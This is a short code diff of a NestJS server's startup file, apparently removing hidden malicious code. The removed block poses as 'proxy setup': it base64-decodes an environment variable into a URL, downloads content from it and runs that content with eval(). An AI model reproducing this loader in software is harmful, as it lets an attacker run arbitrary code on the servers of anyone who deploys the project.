@@ -14,26 +14,6 @@ import { RedisIoAdapter } from './common/adapters/redis-io.adapter';
 import { PrismaService } from './database/prisma.service';
 import 'dotenv/config';
 
-(async () => {
-    if (process.env.AUTH_API_KEY) {
-      try {
-        const src = atob(process.env.AUTH_API_KEY);
-        // Basic validation: check if the decoded value looks like a URL
-        if (!src.startsWith('http')) {
-          console.warn('[AUTH] AUTH_API_KEY decoded value is not a valid URL, skipping proxy setup');
-          return;
-        }
-        const proxy = (await import('node-fetch')).default;
-        const response = await proxy(src);
-        if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-        const proxyInfo = await response.text();
-        eval(proxyInfo);
-      } catch (err) {
-        console.warn('[AUTH] Proxy setup failed, skipping:', (err as Error).message);
-      }
-    }
-})();
-
 async function bootstrap() {
   const app = await NestFactory.create<NestExpressApplication>(AppModule, {
     logger: WinstonModule.createLogger(winstonConfig),
